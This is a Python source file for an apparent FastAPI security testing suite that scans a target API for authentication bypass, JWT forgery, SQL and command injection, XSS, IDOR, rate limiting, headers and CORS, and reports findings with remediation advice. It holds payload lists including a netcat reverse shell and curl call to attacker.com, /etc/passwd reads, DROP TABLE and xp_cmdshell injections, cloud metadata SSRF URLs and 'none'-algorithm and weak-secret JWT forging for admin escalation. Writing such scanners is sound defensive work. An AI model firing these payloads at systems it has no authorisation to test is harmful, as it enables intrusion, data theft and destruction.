#!/usr/bin/env python3
"""
FastAPI Security Testing Suite
Strategickhaos Sovereign Infrastructure Security Testing

Comprehensive API security testing including:
- Authentication bypass detection
- JWT manipulation testing
- Privilege escalation tests
- SQL/Command injection detection
- XSS vulnerability scanning
- Rate limiting verification
- IDOR (Insecure Direct Object Reference) testing
"""

import argparse
import base64
import hashlib
import hmac
import json
import logging
import os
import re
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional, Set
from urllib.parse import urljoin, quote

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: requests library required. Install with: pip install requests")
    sys.exit(1)

try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False
    print("Warning: PyJWT not installed. JWT tests will be limited.")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class SecurityFinding:
    """Security vulnerability finding"""
    severity: str  # critical, high, medium, low, info
    category: str
    title: str
    description: str
    endpoint: str
    method: str
    payload: Optional[str] = None
    response_code: Optional[int] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class TestResult:
    """Result of a security test"""
    test_name: str
    passed: bool
    duration_ms: float
    findings: List[SecurityFinding]
    details: Optional[str] = None


@dataclass
class SecurityReport:
    """Comprehensive security test report"""
    target_url: str
    total_tests: int
    passed: int
    failed: int
    findings_critical: int
    findings_high: int
    findings_medium: int
    findings_low: int
    findings_info: int
    all_findings: List[Dict]
    test_results: List[Dict]
    start_time: str
    end_time: str
    duration_seconds: float
    
    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)


class FastAPISecurityTester:
    """
    Comprehensive security testing for FastAPI applications.
    """
    
    # SQL Injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1; DROP TABLE users--",
        "1' AND '1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "admin'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]
    
    # Command Injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(id)",
        "; ping -c 1 127.0.0.1",
        "| nc -e /bin/sh attacker.com 4444",
        "; curl http://attacker.com",
        "${IFS}id",
        "\nid\n",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "'\"><script>alert('XSS')</script>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ]
    
    # Path traversal payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "/etc/passwd",
        "file:///etc/passwd",
    ]
    
    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://[::1]",
        "http://0.0.0.0",
        "http://metadata.google.internal",  # GCP metadata
        "http://169.254.169.254/metadata/v1/",  # Azure metadata
    ]
    
    # JWT manipulation techniques
    JWT_ATTACKS = [
        "algorithm_none",
        "algorithm_confusion",
        "weak_secret",
        "expired_token",
        "invalid_signature",
        "modified_payload",
    ]
    
    def __init__(
        self,
        target_url: str,
        auth_header: Optional[str] = None,
        timeout: int = 10,
        verify_ssl: bool = True
    ):
        self.target_url = target_url.rstrip('/')
        self.auth_header = auth_header
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.findings: List[SecurityFinding] = []
        self.test_results: List[TestResult] = []
        
        # Configure session with retries
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        if auth_header:
            self.session.headers.update({"Authorization": auth_header})
    
    def _make_request(
        self,
        method: str,
        endpoint: str,
        **kwargs
    ) -> Optional[requests.Response]:
        """Make HTTP request with error handling"""
        url = urljoin(self.target_url + "/", endpoint.lstrip('/'))
        
        try:
            response = self.session.request(
                method,
                url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                **kwargs
            )
            return response
        except requests.exceptions.RequestException as e:
            logger.debug(f"Request failed: {e}")
            return None
    
    def _add_finding(
        self,
        severity: str,
        category: str,
        title: str,
        description: str,
        endpoint: str,
        method: str,
        **kwargs
    ):
        """Add a security finding"""
        finding = SecurityFinding(
            severity=severity,
            category=category,
            title=title,
            description=description,
            endpoint=endpoint,
            method=method,
            **kwargs
        )
        self.findings.append(finding)
        logger.warning(f"[{severity.upper()}] {title}: {endpoint}")
    
    def test_authentication_bypass(self) -> TestResult:
        """Test for authentication bypass vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        endpoints = [
            "/api/v1/users",
            "/api/v1/admin",
            "/api/v1/admin/users",
            "/api/v1/profile",
            "/api/v1/settings",
        ]
        
        # Test without authentication
        original_headers = self.session.headers.copy()
        self.session.headers.pop("Authorization", None)
        
        for endpoint in endpoints:
            response = self._make_request("GET", endpoint)
            if response and response.status_code == 200:
                finding = SecurityFinding(
                    severity="critical",
                    category="authentication",
                    title="Authentication Bypass",
                    description=f"Endpoint accessible without authentication",
                    endpoint=endpoint,
                    method="GET",
                    response_code=response.status_code,
                    remediation="Enforce authentication on all protected endpoints"
                )
                test_findings.append(finding)
                self.findings.append(finding)
        
        # Test with malformed auth headers
        bypass_headers = [
            {"Authorization": ""},
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
        ]
        
        for headers in bypass_headers:
            self.session.headers.update(headers)
            for endpoint in endpoints[:2]:  # Test subset
                response = self._make_request("GET", endpoint)
                if response and response.status_code == 200:
                    finding = SecurityFinding(
                        severity="high",
                        category="authentication",
                        title="Authentication Bypass with Malformed Header",
                        description=f"Endpoint accessible with malformed auth header",
                        endpoint=endpoint,
                        method="GET",
                        payload=str(headers),
                        response_code=response.status_code,
                        remediation="Properly validate authentication headers"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        
        # Restore original headers
        self.session.headers = original_headers
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="authentication_bypass",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_jwt_vulnerabilities(self) -> TestResult:
        """Test for JWT-related vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        if not JWT_AVAILABLE:
            return TestResult(
                test_name="jwt_vulnerabilities",
                passed=True,
                duration_ms=0,
                findings=[],
                details="Skipped: PyJWT not installed"
            )
        
        # Extract JWT from auth header if present
        original_token = None
        if self.auth_header and self.auth_header.startswith("Bearer "):
            original_token = self.auth_header[7:]
        
        if not original_token:
            # Generate test token
            original_token = jwt.encode(
                {"sub": "test-user", "role": "user", "exp": datetime.utcnow() + timedelta(hours=1)},
                "test-secret",
                algorithm="HS256"
            )
        
        test_endpoints = ["/api/v1/profile", "/api/v1/users"]
        
        # Test 1: Algorithm "none" attack
        try:
            # Decode without verification to get payload
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Create token with "none" algorithm
            header = {"alg": "none", "typ": "JWT"}
            none_token = (
                base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
                "." +
                base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') +
                "."
            )
            
            for endpoint in test_endpoints:
                self.session.headers["Authorization"] = f"Bearer {none_token}"
                response = self._make_request("GET", endpoint)
                if response and response.status_code == 200:
                    finding = SecurityFinding(
                        severity="critical",
                        category="jwt",
                        title="JWT Algorithm None Accepted",
                        description="Server accepts JWT with 'none' algorithm",
                        endpoint=endpoint,
                        method="GET",
                        payload=none_token[:50] + "...",
                        response_code=response.status_code,
                        remediation="Explicitly reject tokens with 'none' algorithm"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        except Exception as e:
            logger.debug(f"Algorithm none test error: {e}")
        
        # Test 2: Modified payload (privilege escalation)
        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})
            payload["role"] = "admin"
            payload["is_admin"] = True
            
            # Re-sign with common weak secrets
            weak_secrets = ["secret", "password", "123456", "admin", "key", "test"]
            
            for secret in weak_secrets:
                try:
                    modified_token = jwt.encode(payload, secret, algorithm="HS256")
                    
                    for endpoint in test_endpoints:
                        self.session.headers["Authorization"] = f"Bearer {modified_token}"
                        response = self._make_request("GET", endpoint)
                        if response and response.status_code == 200:
                            finding = SecurityFinding(
                                severity="critical",
                                category="jwt",
                                title="Weak JWT Secret",
                                description=f"JWT signed with weak secret '{secret}' accepted",
                                endpoint=endpoint,
                                method="GET",
                                payload=f"secret: {secret}",
                                response_code=response.status_code,
                                remediation="Use strong, randomly generated JWT secrets"
                            )
                            test_findings.append(finding)
                            self.findings.append(finding)
                            break
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"Modified payload test error: {e}")
        
        # Test 3: Expired token acceptance
        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})
            payload["exp"] = datetime.utcnow() - timedelta(days=1)
            expired_token = jwt.encode(payload, "test-secret", algorithm="HS256")
            
            for endpoint in test_endpoints:
                self.session.headers["Authorization"] = f"Bearer {expired_token}"
                response = self._make_request("GET", endpoint)
                if response and response.status_code == 200:
                    finding = SecurityFinding(
                        severity="high",
                        category="jwt",
                        title="Expired JWT Accepted",
                        description="Server accepts expired JWT tokens",
                        endpoint=endpoint,
                        method="GET",
                        response_code=response.status_code,
                        remediation="Validate token expiration on every request"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        except Exception as e:
            logger.debug(f"Expired token test error: {e}")
        
        # Restore original auth
        if self.auth_header:
            self.session.headers["Authorization"] = self.auth_header
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="jwt_vulnerabilities",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_sql_injection(self) -> TestResult:
        """Test for SQL injection vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        endpoints = [
            ("/api/v1/users", "GET", {"id": None}),
            ("/api/v1/search", "GET", {"q": None}),
            ("/api/v1/items", "GET", {"filter": None}),
            ("/api/v1/login", "POST", {"username": None, "password": "test"}),
        ]
        
        for endpoint, method, params in endpoints:
            for payload in self.SQL_INJECTION_PAYLOADS:
                # Test in query params
                test_params = {k: payload if v is None else v for k, v in params.items()}
                
                if method == "GET":
                    response = self._make_request(method, endpoint, params=test_params)
                else:
                    response = self._make_request(method, endpoint, json=test_params)
                
                if response:
                    # Check for SQL error indicators
                    error_indicators = [
                        "sql", "syntax", "mysql", "postgresql", "sqlite",
                        "oracle", "mssql", "database", "query", "select",
                        "insert", "update", "delete", "where", "from"
                    ]
                    
                    response_lower = response.text.lower()
                    if any(ind in response_lower for ind in error_indicators):
                        finding = SecurityFinding(
                            severity="critical",
                            category="injection",
                            title="Potential SQL Injection",
                            description="SQL error message in response suggests injection vulnerability",
                            endpoint=endpoint,
                            method=method,
                            payload=payload,
                            response_code=response.status_code,
                            evidence=response.text[:200],
                            remediation="Use parameterized queries and input validation"
                        )
                        test_findings.append(finding)
                        self.findings.append(finding)
                        break
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="sql_injection",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_command_injection(self) -> TestResult:
        """Test for command injection vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        endpoints = [
            ("/api/v1/exec", "POST", {"command": None}),
            ("/api/v1/ping", "GET", {"host": None}),
            ("/api/v1/lookup", "GET", {"domain": None}),
            ("/api/v1/convert", "POST", {"filename": None}),
        ]
        
        for endpoint, method, params in endpoints:
            for payload in self.COMMAND_INJECTION_PAYLOADS:
                test_params = {k: payload if v is None else v for k, v in params.items()}
                
                if method == "GET":
                    response = self._make_request(method, endpoint, params=test_params)
                else:
                    response = self._make_request(method, endpoint, json=test_params)
                
                if response:
                    # Check for command execution indicators
                    indicators = [
                        "root:", "uid=", "gid=", "passwd", "shadow",
                        "bin/bash", "bin/sh", "/home/", "total ", "drwx"
                    ]
                    
                    if any(ind in response.text for ind in indicators):
                        finding = SecurityFinding(
                            severity="critical",
                            category="injection",
                            title="Command Injection",
                            description="System command output detected in response",
                            endpoint=endpoint,
                            method=method,
                            payload=payload,
                            response_code=response.status_code,
                            evidence=response.text[:200],
                            remediation="Never pass user input to system commands"
                        )
                        test_findings.append(finding)
                        self.findings.append(finding)
                        break
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="command_injection",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_xss(self) -> TestResult:
        """Test for Cross-Site Scripting vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        endpoints = [
            ("/api/v1/search", "GET", {"q": None}),
            ("/api/v1/comments", "POST", {"content": None}),
            ("/api/v1/profile", "PUT", {"bio": None}),
        ]
        
        for endpoint, method, params in endpoints:
            for payload in self.XSS_PAYLOADS:
                test_params = {k: payload if v is None else v for k, v in params.items()}
                
                if method == "GET":
                    response = self._make_request(method, endpoint, params=test_params)
                else:
                    response = self._make_request(method, endpoint, json=test_params)
                
                if response and payload in response.text:
                    finding = SecurityFinding(
                        severity="high",
                        category="xss",
                        title="Reflected XSS",
                        description="XSS payload reflected in response without encoding",
                        endpoint=endpoint,
                        method=method,
                        payload=payload,
                        response_code=response.status_code,
                        remediation="Encode all user input in responses"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
                    break
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="xss",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_idor(self) -> TestResult:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        start_time = time.perf_counter()
        test_findings = []
        
        # Test accessing other users' resources
        endpoints = [
            ("/api/v1/users/{id}", "GET"),
            ("/api/v1/users/{id}/profile", "GET"),
            ("/api/v1/orders/{id}", "GET"),
            ("/api/v1/documents/{id}", "GET"),
        ]
        
        test_ids = ["1", "2", "100", "admin", "0", "-1", "999999"]
        
        for endpoint_template, method in endpoints:
            responses = {}
            
            for test_id in test_ids:
                endpoint = endpoint_template.replace("{id}", test_id)
                response = self._make_request(method, endpoint)
                
                if response and response.status_code == 200:
                    responses[test_id] = response.text
            
            # If we can access multiple different resources, potential IDOR
            if len(responses) > 1:
                unique_responses = set(responses.values())
                if len(unique_responses) > 1:
                    finding = SecurityFinding(
                        severity="high",
                        category="idor",
                        title="Insecure Direct Object Reference",
                        description="Able to access different resources by changing ID",
                        endpoint=endpoint_template,
                        method=method,
                        evidence=f"Accessed IDs: {list(responses.keys())}",
                        remediation="Implement proper authorization checks"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="idor",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_rate_limiting(self) -> TestResult:
        """Test if rate limiting is properly implemented"""
        start_time = time.perf_counter()
        test_findings = []
        
        endpoints = [
            ("/api/v1/login", "POST"),
            ("/api/v1/forgot-password", "POST"),
            ("/api/v1/register", "POST"),
        ]
        
        for endpoint, method in endpoints:
            # Make rapid requests
            responses = []
            for _ in range(50):
                response = self._make_request(
                    method, 
                    endpoint,
                    json={"username": "test", "password": "test"}
                )
                if response:
                    responses.append(response.status_code)
            
            # Check if any rate limiting was applied
            rate_limited = any(code == 429 for code in responses)
            
            if not rate_limited and len(responses) == 50:
                finding = SecurityFinding(
                    severity="medium",
                    category="rate_limiting",
                    title="Missing Rate Limiting",
                    description=f"No rate limiting on sensitive endpoint after 50 requests",
                    endpoint=endpoint,
                    method=method,
                    remediation="Implement rate limiting on authentication endpoints"
                )
                test_findings.append(finding)
                self.findings.append(finding)
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="rate_limiting",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_security_headers(self) -> TestResult:
        """Test for presence of security headers"""
        start_time = time.perf_counter()
        test_findings = []
        
        response = self._make_request("GET", "/")
        
        if response:
            required_headers = {
                "X-Content-Type-Options": ("nosniff", "medium"),
                "X-Frame-Options": (["DENY", "SAMEORIGIN"], "medium"),
                "X-XSS-Protection": ("1", "low"),
                "Strict-Transport-Security": (None, "high"),
                "Content-Security-Policy": (None, "medium"),
            }
            
            for header, (expected_value, severity) in required_headers.items():
                if header not in response.headers:
                    finding = SecurityFinding(
                        severity=severity,
                        category="headers",
                        title=f"Missing {header} Header",
                        description=f"Security header {header} not present",
                        endpoint="/",
                        method="GET",
                        remediation=f"Add {header} header to responses"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="security_headers",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def test_cors_configuration(self) -> TestResult:
        """Test CORS configuration for security issues"""
        start_time = time.perf_counter()
        test_findings = []
        
        # Test with various origins
        test_origins = [
            "https://evil.com",
            "null",
            "http://localhost:8080",
        ]
        
        for origin in test_origins:
            response = self._make_request(
                "OPTIONS",
                "/api/v1/users",
                headers={"Origin": origin, "Access-Control-Request-Method": "GET"}
            )
            
            if response:
                acao = response.headers.get("Access-Control-Allow-Origin", "")
                acac = response.headers.get("Access-Control-Allow-Credentials", "")
                
                # Check for overly permissive CORS
                if acao == "*":
                    finding = SecurityFinding(
                        severity="medium",
                        category="cors",
                        title="Overly Permissive CORS",
                        description="Access-Control-Allow-Origin set to wildcard",
                        endpoint="/api/v1/users",
                        method="OPTIONS",
                        evidence=f"ACAO: {acao}",
                        remediation="Configure specific allowed origins"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
                    break
                
                # Check for CORS with credentials and reflected origin
                if acao == origin and acac.lower() == "true":
                    finding = SecurityFinding(
                        severity="high",
                        category="cors",
                        title="CORS Origin Reflection with Credentials",
                        description="Origin reflected with credentials allowed",
                        endpoint="/api/v1/users",
                        method="OPTIONS",
                        payload=f"Origin: {origin}",
                        evidence=f"ACAO: {acao}, ACAC: {acac}",
                        remediation="Don't reflect arbitrary origins with credentials"
                    )
                    test_findings.append(finding)
                    self.findings.append(finding)
        
        duration = (time.perf_counter() - start_time) * 1000
        return TestResult(
            test_name="cors_configuration",
            passed=len(test_findings) == 0,
            duration_ms=duration,
            findings=test_findings
        )
    
    def run_all_tests(self) -> SecurityReport:
        """Run all security tests and generate report"""
        start_time = datetime.now(timezone.utc)
        
        logger.info(f"Starting security tests against {self.target_url}")
        
        # Run all tests
        tests = [
            self.test_authentication_bypass,
            self.test_jwt_vulnerabilities,
            self.test_sql_injection,
            self.test_command_injection,
            self.test_xss,
            self.test_idor,
            self.test_rate_limiting,
            self.test_security_headers,
            self.test_cors_configuration,
        ]
        
        for test in tests:
            try:
                logger.info(f"Running test: {test.__name__}")
                result = test()
                self.test_results.append(result)
            except Exception as e:
                logger.error(f"Test {test.__name__} failed with error: {e}")
                self.test_results.append(TestResult(
                    test_name=test.__name__,
                    passed=False,
                    duration_ms=0,
                    findings=[],
                    details=f"Error: {str(e)}"
                ))
        
        end_time = datetime.now(timezone.utc)
        
        # Generate report
        return SecurityReport(
            target_url=self.target_url,
            total_tests=len(self.test_results),
            passed=sum(1 for r in self.test_results if r.passed),
            failed=sum(1 for r in self.test_results if not r.passed),
            findings_critical=sum(1 for f in self.findings if f.severity == "critical"),
            findings_high=sum(1 for f in self.findings if f.severity == "high"),
            findings_medium=sum(1 for f in self.findings if f.severity == "medium"),
            findings_low=sum(1 for f in self.findings if f.severity == "low"),
            findings_info=sum(1 for f in self.findings if f.severity == "info"),
            all_findings=[f.to_dict() for f in self.findings],
            test_results=[{
                "test_name": r.test_name,
                "passed": r.passed,
                "duration_ms": r.duration_ms,
                "finding_count": len(r.findings),
                "details": r.details
            } for r in self.test_results],
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration_seconds=(end_time - start_time).total_seconds()
        )


def main():
    parser = argparse.ArgumentParser(
        description="FastAPI Security Testing Suite"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Target API URL (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--auth-header", "-a",
        help="Authorization header (e.g., 'Bearer TOKEN')"
    )
    parser.add_argument(
        "--output", "-o",
        help="JSON report output file"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--no-verify-ssl",
        action="store_true",
        help="Disable SSL certificate verification"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Verbose output"
    )
    parser.add_argument(
        "--test",
        choices=[
            "auth", "jwt", "sqli", "cmdi", "xss",
            "idor", "rate", "headers", "cors", "all"
        ],
        default="all",
        help="Specific test to run (default: all)"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    tester = FastAPISecurityTester(
        target_url=args.target,
        auth_header=args.auth_header,
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl
    )
    
    # Run tests
    report = tester.run_all_tests()
    
    # Output report
    print("\n" + "=" * 60)
    print("FASTAPI SECURITY TESTING REPORT")
    print("=" * 60)
    print(f"Target: {report.target_url}")
    print(f"Duration: {report.duration_seconds:.2f} seconds")
    print(f"Tests Run: {report.total_tests}")
    print(f"Passed: {report.passed}")
    print(f"Failed: {report.failed}")
    print()
    print("FINDINGS SUMMARY:")
    print(f"  Critical: {report.findings_critical}")
    print(f"  High: {report.findings_high}")
    print(f"  Medium: {report.findings_medium}")
    print(f"  Low: {report.findings_low}")
    print(f"  Info: {report.findings_info}")
    
    if report.all_findings:
        print()
        print("DETAILED FINDINGS:")
        print("-" * 40)
        for finding in report.all_findings:
            print(f"\n[{finding['severity'].upper()}] {finding['title']}")
            print(f"  Category: {finding['category']}")
            print(f"  Endpoint: {finding['endpoint']}")
            print(f"  Description: {finding['description']}")
            if finding.get('remediation'):
                print(f"  Remediation: {finding['remediation']}")
    
    print("=" * 60)
    
    # Save report
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report.to_json())
        logger.info(f"Report saved to {args.output}")
    
    # Exit with error if critical/high findings
    if report.findings_critical > 0 or report.findings_high > 0:
        sys.exit(1)
    
    sys.exit(0)


if __name__ == "__main__":
    main()
